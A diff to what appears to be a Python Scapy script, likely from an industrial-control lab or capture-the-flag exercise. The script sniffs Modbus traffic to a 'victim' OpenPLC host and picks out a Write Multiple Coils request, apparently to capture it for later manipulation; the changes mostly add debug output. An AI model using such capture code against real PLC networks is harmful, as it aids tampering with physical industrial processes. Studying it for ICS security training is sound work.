@@ -7,7 +7,13 @@ flag = True
 your_iface = "eth2"
 victim_ip = "10.77.20.10"
 
+flag = True
+attempt = 1
+
 while flag:
+
+    print(f"\n[*] Capture attempt #{attempt}...")
+    attempt += 1
 
     OPENPLC_FRAMES = sniff(
         iface=your_iface,
@@ -16,30 +22,36 @@ while flag:
         lfilter=lambda p: IP in p and p[IP].dst == victim_ip
     )
 
+    print(f"[*] Captured {len(OPENPLC_FRAMES)} packets")
+
     OPENPLC_WRITE_COILS_QUERY = None
 
-    for pkt in OPENPLC_FRAMES:
+    for i, pkt in enumerate(OPENPLC_FRAMES):
+
+        print(f"    Packet {i}: ", end="")
 
         if Raw not in pkt:
+            print("No Raw payload")
             continue
 
         payload = bytes(pkt[Raw].load)
 
+        print(f"{len(payload)} bytes")
+
         if len(payload) < 14:
+            print("        Skipping (too short for Modbus write request)")
             continue
 
+        transaction_id = int.from_bytes(payload[0:2], "big")
         function_code = payload[7]
 
         print(
-            f"Transaction ID: {payload[0:2].hex()} | "
-            f"Function Code: 0x{function_code:02X}"
+            f"        Transaction ID={transaction_id} "
+            f"Function=0x{function_code:02X}"
         )
 
-        #
-        # Function 15 Write Multiple Coils
-        #
         if (
-            payload[7] == 0x0F and      # Function code
+            payload[7] == 0x0F and
             payload[8:10] == b"\x00\x00" and
             payload[10:12] == b"\x00\x05" and
             payload[12] == 0x01
@@ -47,12 +59,15 @@ while flag:
             OPENPLC_WRITE_COILS_QUERY = pkt
 
             print(
-                "[+] End of communication loop "
-                "(Write Multiple Coils) detected"
+                "        [+] Write Multiple Coils packet matched"
             )
 
             flag = False
             break
+
+    if flag:
+        print("[*] Waiting for next communication cycle...")
+
 
 
 if OPENPLC_WRITE_COILS_QUERY is None:
